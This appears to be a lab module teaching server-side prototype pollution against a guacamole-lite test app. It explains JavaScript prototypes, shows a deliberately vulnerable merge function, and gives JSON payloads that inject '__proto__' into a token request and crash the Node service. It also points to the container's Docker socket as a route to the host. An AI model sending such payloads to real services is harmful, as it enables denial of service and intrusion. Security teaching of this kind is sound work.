# Guacamole Lite Prototype Pollution
Prototype pollution refers to a JavaScript vulnerability in which an attacker can inject properties in every object created by an application. In this module, we will be concentrating on server-side attacks. While client-side prototype pollution attacks exist, they are slightly different.

Prototype pollution vulnerabilities often appear in libraries that merge or extend objects. For a web application to be vulnerable to prototype pollution in an exploitable way, it must use a vulnerable merge/extend function and provide a path to code execution or authentication bypass using the injected properties.

In order to practically demonstrate the vulnerability, we have created a basic application that uses `guacamole-lite` (a Node package for connecting to RDP clients via a browser) and various templating engines. Guacamole-lite uses a library that is vulnerable to prototype pollution when processing untrusted user input. We will leverage prototype pollution against two different templating engines to achieve RCE on the target.

We'll take a whitebox approach to teach the concepts, but we will also cover how we can discover a vulnerability like this using blackbox concepts.

## Getting Started 
By reviewing the requests in the BurpSuite HTTP history, we find three interesting requests. First we discover a `POST` to `/tokens` containing a JSON payload with the connection information.
```json
{"connection":{"type":"rdp","settings":{"hostname":"rdesktop","username":"abc","password":"abc","port":"3389","security":"any","ignore-cert":"true","client-name":"","console":"false","initial-program":""}}}
```
Next, we find a `GET` request to `/rdp` with a `token` query parameter containing a base64 payload. When decoded, the payload displays a JSON object containing `iv` and `value` parameters. Based on the existence of an `iv` parameter, we can assume that this payload is encrypted. This will be important later on.
```json
{"iv":"2adZF2TfRjtpMrvmecrDGg==","value":"9XgeuzMhaP/HWK8MIleTt5cb4fgjoUIgMRXm/L1BjIdZt/fuoY7MliqgJ8b4uHUuVgQazg8+EEMDlqlaosHP5LAQEJri1iuIXp21fyodsfS16vmJTrEEh/cPJaWwmN2TZMrnO1pGqaUGmXbfU3j71XMobxAyA8f0qJixGSyYIQJACnToTGmJA57jfwYfpv4dOQ5wC0jfYsMVgklnJXgjOhzQxJHsBwjVy+V/94riGifKVeO9mmIrf9BwZONOmn3Bk+bnb3BbFSNS2vuoDnvx2w=="}
```
Finally, we also find a `GET` request to `/guaclite` with the same token value discovered earlier. This request responds with a `"101 Switching Protocols"` response, which is used to start a WebSocket connection.

Considering that we have not found any HTTP requests that stream the image, sound, and mouse movements to the RDP client, we can assume that this is made through the WebSocket connection. We can confirm this by clicking on *WebSockets* history in Burp Suite and reviewing the captured information.

### Understanding the Code
Let's begin by downloading the code to our Kali machine:
```bash
rsync -az --compress-level=1 student@chips:/home/student/chips/ chips/
```
The downloaded code has the following folder structure:
```bash
chips/
├── app.js
├── bin
│   └── www
├── docker-compose.yml
├── Dockerfile
├── .dockerignore
├── frontend
│   ├── index.js
│   ├── rdp.js
│   ├── root.js
│   └── style
├── node_modules
│   ├── abbrev
│   ├── accepts
    ...
├── package.json
├── package-lock.json
├── public
│   ├── images
│   └── js
├── routes
│   ├── files.js
│   ├── index.js
│   ├── rdp.js
│   └── token.js
├── settings
│   ├── clientOptions.json
│   ├── connectionOptions.json
│   └── guacdOptions.json
├── shared
│   └── README.md
├── version.txt
├── views
│   ├── ejs
│   ├── hbs
│   └── pug
├── .vscode
│   └── launch.json
└── webpack.config.js
```
The existence of `bin/www`, `package.json`, and `routes/` indicate that this is a **NodeJS web application**. In particular, `package.json` identifies a NodeJS project and manages its dependencies.

The existence of the `docker-compose.yml` and `Dockerfile` files indicate that this application is started using Docker containers.

Let's review `package.json` to get more information about the application.
```json
01  {
02    "name": "chips",
03    "version": "1.0.0",
04    "private": true,
05    "scripts": {
06      "start-dev": "node --inspect=0.0.0.0 ./bin/www",
07      "watch": "webpack watch --mode development",
08      "start": "webpack build --mode production && node ./bin/www",
09      "build": "webpack build --mode development"
10    },
11    "devDependencies": {
12      "@babel/core": "^7.13.1",
...
24      "webpack": "^5.24.2",
...
33    },
34    "dependencies": {
35      "cookie-parser": "~1.4.4",
36      "debug": "~2.6.9",
37      "dockerode": "^3.2.1",
38      "dotenv": "^8.2.0",
39      "ejs": "^3.1.6",
40      "express": "~4.16.1",
41      "guacamole-lite": "0.6.3",
42      "hbs": "^4.1.1",
43      "http-errors": "~1.6.3",
44      "morgan": "~1.9.1",
45      "pug": "^3.0.2"
46    }
47  }
```
The `package.json` reveals three key details:

1. The app starts via `./bin/www` (line 6).
2. `webpack` is used (lines 7–10, 24), suggesting the `frontend` directory holds bundled client-side assets, including WebSocket code.
3. The app uses the Express framework (line 40), so the `routes` directory likely contains endpoint definitions.

This means that the routes directory will probably contain the definitions to the endpoints we discovered earlier.

Let's analyze `./bin/www` to understand how the application is started.
```javascript
01  #!/usr/bin/env node
...
07  var app = require('../app');
08  var debug = require('debug')('app:server');
09  var http = require('http');
10  const GuacamoleLite = require('guacamole-lite');
11  const clientOptions = require("../settings/clientOptions.json")
12  const guacdOptions = require("../settings/guacdOptions.json");
13
...
25  var server = http.createServer(app);
26
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions);
28
29  /**
30   * Listen on provided port, on all network interfaces.
31   */
32
33  server.listen(port);
34  server.on('error', onError);
35  server.on('listening', onListening);
...
```
From this file we learn that `app.js` is loaded and used to create the server. Note that `".js"` is omitted from `require` statements. On lines 33-35, the HTTP server is started. However, before it is started, the server is also passed into the GuacamoleLite constructor (line 27). This could allow the `guacamole-lite` package to create endpoints not defined in Express.

Next, let's review the `app.js` file.
```javascript
01  var createError = require('http-errors');
02  var express = require('express');
03  var path = require('path');
...
11
13  var app = express();
14
15  // view engine setup
16  t_engine = process.env.TEMPLATING_ENGINE;
17  if (t_engine !== "hbs" && t_engine !== "ejs" && t_engine !== "pug" )
18  {
19      t_engine = "hbs";
20  }
21
22 app.set('views', path.join(__dirname, 'views/' + t_engine));
23 app.set('view engine', t_engine);
...
30
31  app.use('/', indexRouter);
32  app.use('/token', tokenRouter);
33  app.use('/rdp', rdpRouter);
34 app.use('/files', filesRouter);
...
```
The `app.js` file configures key parts of the application. It defines two routes (lines 32–33) and sets up support for multiple templating engines—`hbs` (`Handlebars` - default), `EJS`, and `Pug`—based on the `TEMPLATING_ENGINE` environment variable (lines 16–20). While this flexibility is uncommon in web applications, it was intentionally added to demonstrate different methods of exploiting prototype pollution.

To show how to change the templating engine, we'll review `docker-compose.yml` to better understand the layout of the application.
```yml
1	 version: '3'
2	 services:
3	   chips:
4	     build: .
5	     command: npm run start-dev
6	     restart: always
7	     environment:
8	       - TEMPLATING_ENGINE
9	     volumes:
10	      - .:/usr/src/app
11	      - /var/run/docker.sock:/var/run/docker.sock
12	    ports:
13	      - "80:3000"
14	      - "9229:9229"
15	      - "9228:9228"
16	  guacd:
17	    restart: always
18	    image: linuxserver/guacd
19	    container_name: guacd
20	
21	  rdesktop:
22	    restart: always
23	    image: linuxserver/rdesktop
24	    container_name: rdesktop
25      volumes:
26        - ./shared:/shared
27	    environment:
28	      - PUID=1000
29	      - PGID=1000
30	      - TZ=Europe/London
```
The `docker-compose.yml` file shows that the application runs using the `start-dev` script (line 5), enabling debugging on port `9229`—something unsafe for production but useful for exploitation testing. It also uses the `TEMPLATING_ENGINE` environment variable (line 8), allowing us to change the templating engine from the command line. Notably, **the `chips` container has access to the Docker socket (line 11), which could allow container escape and remote code execution on the host if we gain RCE in the web app**. For now, the focus remains on understanding the application layout.

Let's try changing templating engines. First, we'll stop the existing instance of the application with `docker-compose down`.
```bash
student@chips:~/chips$ docker-compose down
Stopping rdesktop          ... done
Stopping chips_chips_1     ... done
Stopping guacd             ... done
Stopping chips_chips_run_2 ... done
Stopping chips_chips_run_1 ... done
Removing rdesktop          ... done
Removing chips_chips_1     ... done
Removing guacd             ... done
Removing chips_chips_run_2 ... done
Removing chips_chips_run_1 ... done
Removing network chips_default
student@chips:~/chips$
```
Once the application is stopped, we can start it and set `TEMPLATING_ENGINE=ejs` before the `docker-compose up` command. This will instruct `app.js` to use the EJS templating engine and the views found in the `views/ejs` folder. Starting the application should only take a couple of seconds. Once the logs start to slow down, the application should be started.
```bash
student@chips:~/chips$ TEMPLATING_ENGINE=ejs docker-compose up
Starting rdesktop        ... done
Starting chips_chips_1   ... done
Starting guacd           ... done
Attaching to guacd, chips_chips_1, rdesktop
guacd       | [s6-init] making user provided files available at /var/run/s6/etc...exited 0.
...
guacd       | [services.d] done.
rdesktop    | [s6-init] making user provided files available at /var/run/s6/etc...exited 0.
....
rdesktop    | [services.d] done.
chips_1     | 
chips_1     | > app@0.0.0 start-dev /usr/src/app
...
chips_1     | Starting guacamole-lite websocket server
```
The application was built with comments in the views for all the templating engines. We'll use these comments to differentiate between the templating engines.
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://chips -s | grep "<\!--"
        <!-- Using EJS as Templating Engine -->
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
We are now running Chips using the EJS templating engine. We'll use this setup for now and change engines later on in the module.
### Configuring Remote Debugging
A `.vscode/launch.json` file is provided within the Chips source code, which we can use to quickly set up debugging. We will need to update both `address` fields to point to the remote server (`chips`).

There are two remote debugging profiles configured. The first is on port `9229`. The application is already started using the `start-dev` script from `package.json`, which will start Node on port `9229`. To validate that this is working, we need to navigate to the `Run and Debug` tab in Visual Studio Code and start the profile.

When the remote debugging is connected, the `Debug Console` will show `"Starting guacamole-lite websocket server"` and the bottom bar will turn orange.

To begin exploring prototype pollution and templating engines, we first connect to the Node.js CLI with debugging enabled. This involves opening a new SSH session to the `chips` server and using `docker-compose exec` to run `node --inspect=0.0.0.0:9228` in the `chips` container. 
```bash
docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
```

This starts an interactive Node.js shell with remote debugging on port `9228.` In Visual Studio Code, we then select the `"Attach to remote (cli)"` option to start debugging, confirmed by an orange status bar and a `"Debugger attached"` message.

```bash
student@chips:~/chips$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/6325ffd8-79b5-42d1-b9db-500dfe12ec91
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.1.
Type ".help" for more information.
> Debugger attached.

```
## Introduction to JavaScript Prototype
<details>
  <summary><b>Click to expand</b></summary>

Before we discuss the JavaScript prototype, we must first understand that **nearly everything in JavaScript is an object**. This includes arrays, Browser APIs, and functions. The only exceptions are null, undefined, strings, numbers, booleans, and symbols.

Unlike other object-oriented programming languages, **JavaScript is not considered a class-based language**. As of the `ES2015` standard, JavaScript does support class declarations. However, in JavaScript **the `class` keyword is a helper function** that makes existing JavaScript implementations more familiar to users of class-based programming.

We'll demonstrate this by creating a class and checking the type.
```bash
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/b38f428b-edfa-42cf-be6a-590bc333a3ad
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> class Student {
...     constructor() {
.....     this.id = 1;
.....     this.enrolled = true
.....   }
...     isActive() {
...             console.log("Checking if active")
...             return this.enrolled
...     }
... }
undefined

> s = new Student
Student { id: 1, enrolled: true }

> s.isActive()
Checking if active
true

> typeof s
'object'

> typeof Student
'function'
```
We find that the `Student` class is actually a function. But what does this mean? Before `ES2015`, classes would be created using `constructor` functions.
```bash
> function Student() {
...     this.id = 2;
...     this.enrolled = false
... }
undefined
> 

> Student.prototype.isActive = function() {
...     console.log("Checking if active")
...     return this.enrolled;
... };
[Function (anonymous)]

> s = new Student
Student { id: 2, enrolled: false }

> s.isActive()
Checking if active
false

> typeof s
'object'

> typeof Student
'function'
```
**The `class` keyword in JavaScript is just syntactic sugar for the `constructor` function.**

Both `class` and the `constructor` function use the `new` keyword to create an object from the class. Let's investigate how this keyword works.

According to the documentation, JavaScript's `new` keyword will first create an empty object. Within that object, it will set the `__proto__` value to the constructor function's prototype (where we set isActive). With `__proto__` set, the `new` keyword ensures that this refers to the context of the newly created object. The code above shows that `this.id` and `this.enrolled` of the `new` object are set to the respective values. Finally, this is returned (unless the function returns its own object).

The use of `prototype` and `__proto__` can be confusing for those familiar with other object-oriented programming languages like C# and Java.

Many object-oriented programming languages, such as Java, use a class-based inheritance model in which a blueprint (class) is used to instantiate individual objects, which represent an item in the real world. The car we own (object in the real world) would inherit from a `Car` class (the blueprint), which contains methods on how to move, brake, turn, etc.

In this class-based inheritance model, we can run the `move()` function in the `Car` object, which was inherited from the `Car` class. However, we cannot run `move()` directly in the `Car` class since it's only a blueprint for other classes. We also cannot inherit from multiple classes, like we would if we wanted to inherit from a vehicle class and a robot class to create a half-car, half-robot Transformer.

However, JavaScript uses prototype inheritance, which means that an object inherits properties from another object. If we refer back to the code above, `Student` is a function (don't forget that functions are also objects). When we create an s object, the `new` keyword inherits from the `Student` object.

JavaScript benefits from prototype inheritance in many ways. For starters, one object may inherit the properties of multiple objects. In addition, the properties inherited from higher-level objects can be modified during runtime.9 This could, for example, allow us to create our desired Transformer with dynamically changing `attack()` functions that are modified for each Transformer's unique power.

The ability to change the inherited properties of a set of objects is a powerful feature for developers. However, this power can also be used to exploit an application if improperly handled.

It's important to note that `__proto__` is part of the prototype chain, but `prototype` is not. Remember, the `new` keyword sets `__proto__` to the constructor function `prototype`.

Earlier, we set the `isActive` prototype of `Student` to a function that logs a message to the console and returns the status of the Student. It should not come as a surprise that we can call the `isActive` function directly from the "class".
```javascript
> Student.prototype.isActive()
Checking if active
undefined
```

As expected, the function executed, logged to the console, and returned `"undefined"` since `enrolled` is not set in the prototype instance. However, if we try to access isActive within the `Student` function constructor instead of the prototype, the function is not found.

```javascript
> Student.isActive
undefined
```

This is because `prototype` is not part of the prototype chain but `__proto__` is. When we run `isActive` on the `s` object, we are actually running the function within `s.__proto__.isActive()` (with this context properly bound to the values in the object). We can validate this by creating a new `isActive` function directly in the `s` object instead of running the one in `__proto__`. We can then delete the new `isActive` function and observe that the prototype chain resolves the old `isActive` function from `__proto__`.

```javascript
> s.isActive()
Checking if active
false

> s.isActive = function(){
... console.log("New isActive");
... return true;
... }
[Function (anonymous)]

> s.isActive()
New isActive
true

> s.__proto__.isActive()
Checking if active
undefined

> delete s.isActive
true

> s.isActive()
Checking if active
false
```

When we set `isActive` on the `s` object directly, `__proto__.isActive` was not executed.

One interesting component of this chain is that when `Student.prototype.isActive` is modified, so is `s.__proto__.isActive`.

```javascript
> Student.prototype.isActive = function () {
... console.log("Updated isActive in Student");
... return this.enrolled;
... }
[Function (anonymous)]

> s.isActive()
Updated isActive in Student
false
```
When we called the `s.isActive()` function, the updated function was executed because the `isActive` function is a link from the `__proto__` object to the prototype of `Student`.

If we poke around the s object further, we find there are other functions that are available that we did not set, like `toString`.
```javascript
> s.toString()
'[object Object]'
```
The `toString` function returns a string representation of the object. This `toString` function is a built-in function in the prototype of the `Object` class.

Note that `Object` (capital "O") refers to the `Object data-type` class. `s` is an object that inherits properties from the `Student` class. The `Student` class inherits properties from the `Object` class (since almost everything in JavaScript is an Object).

```javascript
> o = new Object()
{}

> o.toString()
'[object Object]'

> {}.toString()
'[object Object]'
```
We can add a new `toString` to be something a bit more usable in our object by setting `toString` in the prototype of the `Student` constructor function.
```javascript
> s.toString()
'[object Object]'

> Student.prototype.toString = function () {
... console.log("in Student prototype");
... return this.id.toString();
... }
[Function (anonymous)]

> s.toString()
in Student prototype
'2'
```
The `toString` function now returns the `id` of the `Student` as a string.

As we demonstrated earlier, we can also add `toString` directly to the `s` object.
```javascript
> s.toString = function () {
... console.log("in s object");
... return this.id.toString();
... }
[Function (anonymous)]

> s.toString()
in s object
'2'
```

At this point, this object has three `toString` functions in its prototype chain. The first is the Object class prototype, the second is in the `Student` prototype, and the last is in the `s` object directly. The prototype chain will select the one that comes up first in the search, which in this case is the function in the `s` object. If we create a new object from the `Student` constructor, which `toString` method will be the default when called?

```javascipt
> s2 = new Student()
Student { id: 2, enrolled: false }

> s2.toString()
in Student prototype
'2'
```

The new `Student` object uses the `toString` method within the `Student` prototype.

What would happen if we changed the `toString` function in the Object class prototype?

```javascript
> Object.prototype.toString = function () {
... console.log("in Object prototype")
... return this.id.toString();
... }
[Function (anonymous)]

> delete s.toString
true

> delete Student.prototype.toString
true

> s.toString()
in Object prototype
'2'
```

we set the `toString` to log a message and return the `id`. We also deleted the other `toString` functions in the chain to ensure we execute the one in Object. When we run `s.toString()`, we find that we are indeed running the `toString` function in the Object prototype.

Remember earlier when we found that even new Objects get the updated prototype when changed in the constructor, and that almost everything in JavaScript is made with Objects? Well, let's check out the `toString` function of a blank object now.

```javascript
> {}.toString()
in Object prototype
Uncaught TypeError: Cannot read property 'toString' of undefined
    at Object.toString (repl:3:16)
```

Since the blank object does not have an id, we receive an error. However, because of this error and the "in Object prototype" message, we know that we are executing the custom function we created in the Object prototype.

At this point, we have polluted the prototype of nearly every object in JavaScript and changed the toString function every time it is executed.

These changes to the toString function only affect the current interpreter process. However, they will continue to affect the process until it is restarted. In order to wipe this change, we must exit the Node interactive CLI and start a new interactive session.

Similarly, Node web applications are affected in the same way. Once the prototype is polluted, it will stay that way until the application is rebooted or crashes, which causes a reboot.

Next, let's discuss how we can use prototype pollution to our advantage.

</details>

### Prototype Pollution

<details>
  <summary><b>Click to expand</b></summary>


Prototype pollution was not always considered a security issue. In fact, it was used as a feature to extend JavaScript in third-party libraries. For example, a library could add a `"first"` function to all `arrays()`, `"toISOString"` to all `Dates`, and `"toHTML"` to all objects.

However, this caused issues with future-proofing code since any native implementations that came out later would be replaced by the less efficient third-party API. Even so, this by itself is not a security issue.

However, if an application accepts user input and allows us to inject into the prototype of Object, this creates a security issue.

While there are many situations that might cause this, **it often occurs in `extend` or `merge` type functions**. These functions merge objects together to create a new merged or extended object.

For example, consider the following code:
```javascript
const { isObject } = require("util");   

function merge(a,b) {
	for (var key in b){
		if (isObject(a[key]) && isObject(b[key])) {
			merge(a[key], b[key])
		}else {
			a[key] = b[key];
		}
	}
	return a
}
```
The **`merge`** function above accepts two objects. It iterates through each key in the second object. If the value of the key in the first and second object are also objects, the function will recursively call itself and pass in the two objects. If these are not objects, the value of the key in the first object will be set to the value of the key in the second object using computed property names.

Using this method, we can merge two objects:
```javascript
> const { isObject } = require("util");
undefined
> function merge(a,b) {
... 	for (var key in b){
..... 		if (isObject(a[key]) && isObject(b[key])) {
....... 			merge(a[key], b[key])
....... 		}else {
....... 			a[key] = b[key];
....... 		}
..... 	}
... 	return a
... }
undefined

> x = {"hello": "world"}
{ hello: 'world' }

> y = {"foo" :{"bar": "foobar"}}
{ foo: { bar: 'foobar' } }

> merge(x,y)
{ hello: 'world', foo: { bar: 'foobar' } }
```
This gets interesting when we set the `"__proto__"` key in the second object to another object.

```javascript
> x = {"hello": "world"}
{ hello: 'world' }

> y = {["__proto__"] :{"bar": "foobar"}}
{ __proto__: { bar: 'foobar' } }

> merge(x,y)
{ hello: 'world' }
```

*The square brackets around `"__proto__"` will ensure that `__proto__` will be enumerable. Setting the value this way sets `isProtoSetter` to `false`, making the object enumerable by the for loop in the merge function.*

When the `merge` function runs, it detects that both `x["__proto__"]` and `y["__proto__"]` are objects, so it recursively calls itself. In the second call, it finds the `bar` property in `y["__proto__"]` and sets it on `x["__proto__"]`, which points to the global `Object.prototype`. As a result, all newly created objects inherit this polluted `bar` property, demonstrating prototype pollution.

```javascript
> {}.bar
'foobar'
```
Clearly, this can become dangerous if, for example, we begin adding attributes like `"isAdmin"` to all objects. If the application is coded in a particular way, all users suddenly become administrators.

Even if `__proto__` of one object is the prototype of a user-defined class (like in our Student example earlier), we can chain multiple `"__proto__"` keys until we reach the Object class prototype:
```javascript
> delete {}.__proto__.bar
true

> function Student() {
... this.id = 2;
... this.enrolled = false
... }
undefined

> s = new Student
Student { id: 2, enrolled: false }

> s2 = new Student
Student { id: 2, enrolled: false }

> x = {"foo": "bar"}
{ foo: 'bar' }

> merge(s,x)
Student { id: 2, enrolled: false, foo: 'bar' }

> x = {["__proto__"]: { "foo": "bar" }}
{ __proto__: { foo: 'bar' } }

> merge(s,x)
Student { id: 2, enrolled: false, foo: 'bar' }

> {}.foo
undefined

> s.foo
'bar'

> s2.foo
'bar'
```

In this case, when we set the `"__proto__"` object only one level deep, we are actually only interacting with the prototype of the `Student` class. As a result, both `s` and `s2` have the value of `foo` set to `"bar"`.
```javascript
> x = {["__proto__"]: { ["__proto__"]: {"foo": "bar" }}}
{ __proto__: { __proto__: { foo: 'bar' } } }

> merge(s,x)
Student { id: 2, enrolled: false, foo: 'bar' }

> {}.foo
'bar'
```
However, when we set the `"__proto__"` object multiple levels deep, we find that we begin interacting higher up in the prototype chain. At that point, all objects start to have the value of `foo` set to `"bar"`.

It's important to note that for a merge function to be vulnerable (and functional), it must recursively call itself when the value of the keys are both objects. For example, the following code is not vulnerable and does not properly merge two objects:

```javascript
function badMerge (a,b) {
  for (var key in b) {
    a[key] = b[key]; 
  }
  return a
}
```

A function like this does not work as a true merge function since it does not recursively merge objects.

```javascript
> delete {}.__proto__.foo
true

> function badMerge (a,b) {
...   for (var key in b) {
.....     a[key] = b[key]; 
.....   }
...   return a
... }
undefined

> x = {"foo": {"bar": "foobar" }}
{ foo: { bar: 'foobar' } }

> y = {"foo": {"hello": "world" }}
{ foo: { hello: 'world' } }

> merge(x,y)
{ foo: { bar: 'foobar', hello: 'world' } }

> x = {"foo": {"bar": "foobar" }}
{ foo: { bar: 'foobar' } }

> y = {"foo": {"hello": "world" }}
{ foo: { hello: 'world' } }

> badMerge(x,y)
{ foo: { hello: 'world' } }
```
Since `badMerge` does not recursively call itself on objects to merge individual objects, the individual keys in an object are not merged. Because of this, a function like `badMerge` would not be vulnerable to prototype pollution.

There are a few more minor details about prototype pollution that we should consider before moving on. For example, variables polluted into the prototype are enumerable in `for...in` statements.

```javascript
> x = {"hello": "world"}
{ hello: 'world' }

> y = {["__proto__"] :{"bar": "foobar"}}
{ __proto__: { bar: 'foobar' } }

> merge(x,y)
{ hello: 'world' }

> for (var key in {}) console.log(key)
bar
```

The polluted variables are also enumerable in arrays.

```javascript
> for (var i in [1,2]) console.log(i)
0
1
bar
```
This occurs because `for...in` statements will iterate over all the enumerable properties. However, the variable in the prototype does not increase the array length. Because of this, if a loop uses the array length, the polluted variables are not enumerated.

```javascript
> for (i = 0; i< [1,2].length; i++) console.log([1,2][i])
1
2
undefined
```
This is also true of the forEach loop since ECMAscript specifies that `forEach` use the length of the array.

```javascript
> [1,2].forEach(i => console.log(i))
1
2
```

Now that we know how to use JavaScript's prototype and how to pollute with it, let's investigate how to discover it using blackbox and whitebox techniques.

</details>

### Blackbox Discovery

<details>
  <summary><b>Click to expand</b></summary>

These techniques are abrasive and might lead to denial of service of the target application. Unlike reflected XSS, **prototype pollution will continue affecting the target application until it is restarted**.

Up to this point, we have been using JavaScript objects to demonstrate the power of prototype pollution. However, we usually cannot pass direct JavaScript objects within HTTP requests. Instead, the requests would need to contain some kind of serialized data, such as JSON.

In these situations, when a vulnerable merge function is executed, the data is first parsed from a JSON object into a JavaScript object. More commonly, libraries will include middleware that will automatically parse an HTTP request body, with `"application/json"` content type, as JSON.

Not all prototype pollution vulnerabilities come from the ability to inject `"__proto__"` into a JSON object. Some may split a string with a period character (`"file.name"`), loop over the properties, and set the value to the contents. In these situations, other payloads like `"constructor.prototype"` would work instead of `"__proto__"`. These types of vulnerabilities are more difficult to discover using blackbox techniques.

To discover a prototype pollution vulnerability, we can replace one of the commonly used functions in the Object prototype in order to get the application to crash. For example, `toString` is a good target since many libraries use it and if a string is provided instead of a function, the application would crash.

Earlier, we discovered our target application accepts JSON on input in `POST` requests to the `/token` endpoint. Let's try to understand what happens if we try to replace the `toString` function with a string.

First, let's capture a `POST` request to `/token` in BurpSuite and send it to *Repeater*.

Next, let's add a payload that will replace the `toString` function with a string in the object prototype (if it's vulnerable). We'll add this at end of the JSON after the connection object and send the request.

```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": ""
    },
    "__proto__": {
      "toString": "foobar"
    }
  }
}

```
As we noticed earlier when we were exploring the application, the token in the response is encrypted and used for subsequent requests. To ensure that this payload propagates, let's use this token in the `/rdp` endpoint, as intended.

```text
http://chips/rdp?token=eyJpdiI6IjhWY2F0cFM0blE4djdqUWZDM1g5WXc9PSIsInZhbHVlIjoidGMvU2FzdldIdVVNdHhOS2V0RjdydlVYdHZnNi9USTVqZTlYQUsvaEVpNU5VdnJiemdaUjlsWlZVY2h0ZUY5a0RKYkR0KzQwdDlDVURBTlp2SDVZck1uTnF1d1VNZ0JoaUxWTDhQZFNsOGNPOURpZG80OXlVbUVISHYvUEFIVW5UV0tzZWxJSVd3dHlwUGdGWGplSmdOVTRkMDJvdE9NdUdPVWIyVjZhUnRvMElUNkZRdS9IcTFrYmo2dWNaV3JNa2NkT1BsOHdYSy9WVlduUHFSUDhtWWI4RUlKeEptd05PMkZUMk5Gb3hMOWJDMHhwL2pIZVZNYnRmV0JlVVB4UjhZbC9CVU4rY1AyTzNRL3BiRHRETnVobWpoNHlQTSs4WGMwNUtJMWFkK3I4czJFTExWSWVFdjNLRmtyWnJrQTNOMzRXQ01acGVmeUpSdXU2cGtZcVdnPT0ifQ==
```

Navigating to the page in a browser loads the RDP endpoint as if nothing is wrong. If we reload the page, the application still works. It seems as if this request did not pollute the prototype.

Although the initial result may seem discouraging, we shouldn't give up. If the application uses a vulnerable `merge` function, it’s possible only certain objects are affected. To investigate further, we should analyze the original JSON payload.

The connection object has two keys: type and `settings`. An object like `settings` is popular for merging because the developer may have a set of defaults that they wish to use but extend those defaults with user-provided settings.

This time, let's attempt to set the payload in the `settings` object instead of the `connection` object and send the request.

```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "toString": "foorbar"
      }
    }
  }
}

```
Again, we will use the `token` in the response in the `/rdp` endpoint.
```text
http://chips/rdp?token=eyJpdiI6IlM4a0h1bmxLdWR5SlZtdFI0Vko5MWc9PSIsInZhbHVlIjoiQXVDcUw1UkVSZ2JDb3VTUUFWc01KRXhZQVppMWpyVmp2TnZEMWtwVGNvNEd6eC9TWE9JdjcwekRrU2xDdGRnRDBTakpoYkl5c25oWUhkWFJWL1BMbXRzMHN5SWlpTkhlSmd4WXBGaXI5eFgwTHlEOVo1U1R6QUNIZmxBSTJKTDdkVTlZTERPRlhJZUVEQ3RtTVRDL2p1bHhvWFg4NEZadm1pQXlIMG5jTmZNWUx5RVVpZ1ArNlRRMG4yWDdJdzNQWXJtNTFUbzhXZnNMSkplckhIVUw5NEg3bTMxeHMrU0tSRFpyYm1IK1ZVOVlXcmlzelY3TWN6K3ExYzFnbEZodTVYOG95ZEdnTHhETW9RT1RlQ2dIa2tvR3E4YitVTnAxR0xUbVFhQ3hBOXM5bWFHWS9keGVxVFNTRytvTmNvMnhhbGlZZWNrMVVNNFlkMlluTUt0aXhBPT0ifQ==
```
This time, the application responds, but the RDP connection does not load. In addition, refreshing the page shows that the application is no longer running.

As before, the only way to recover is to restart Node. In a true blackbox assessment, we would not have access to restart the application. However, to understand the vulnerability more, let's investigate the last lines of the docker-compose output before the application crashed.

We can obtain the logs of the application at any point by running `docker-compose -f ~/chips/docker-compose.yml logs chips` in an ssh session.

```
/usr/src/app/node_modules/moment/moment.js:28
            Object.prototype.toString.call(input) === '[object Array]'
                                      ^

TypeError: Object.prototype.toString.call is not a function
    at isArray (/usr/src/app/node_modules/moment/moment.js:28:39)
    at createLocalOrUTC (/usr/src/app/node_modules/moment/moment.js:3008:14)
    at createLocal (/usr/src/app/node_modules/moment/moment.js:3025:16)
    at hooks (/usr/src/app/node_modules/moment/moment.js:16:29)
    at ClientConnection.getLogPrefix (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:82:22)
    at ClientConnection.log (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:78:22)
    at /usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:44:18
    at Object.processConnectionSettings (/usr/src/app/node_modules/guacamole-lite/lib/Server.js:117:64)
    at new ClientConnection (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:37:26)
    at Server.newConnection (/usr/src/app/node_modules/guacamole-lite/lib/Server.js:149:59)
```
The `moment` library attempted to run `toString`. When it did, the application crashed with an `"Object.prototype.toString.call is not a function"` error.

Let's restart the application and use a whitebox approach to understand why this error occurred and where exactly the prototype pollution exists.

</details>

```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "toString": "foorbar"
      }
    }
  }
}
```

### Whitebox Discovery

<details>
  <summary><b>Click to expand</b></summary>

While a prototype pollution vulnerability may exist inside the main application, it is unlikely. Many libraries provide merge and extend functionality so that the developers do not have to create their own function. Nevertheless, it's important to check.

We can search for computed property names that accept a variable to reference a key in an object (as we discovered in the `merge` function). To do this, we would search for square brackets (`[`) with a variable in between. However, the target application (not including the additional libraries) is so small that searching for a single square bracket is feasible. In other circumstances, this would usually have to be done with a manual code review.

The search revealed four files. `webpack.config.js` is used to generate the client-side code and `public/js/index.js` is the client-side code generated by Webpack. We can ignore these. The only other files are `routes/index.js` and `routes/files.js` but they uses the square bracket to access an array, which protects it from prototype pollution.

With the application source code ruled out for prototype pollution, let's start reviewing the libraries. 

To do this, we'll first run `npm list` to view the packages. However, when we reviewed the `package.json` file earlier, we noticed that it contained a list of `devDependencies`. We do not need to review these unless we are searching for client-side prototype pollution. To remove those from our list, we'll use `-prod` as an argument to `npm list`.

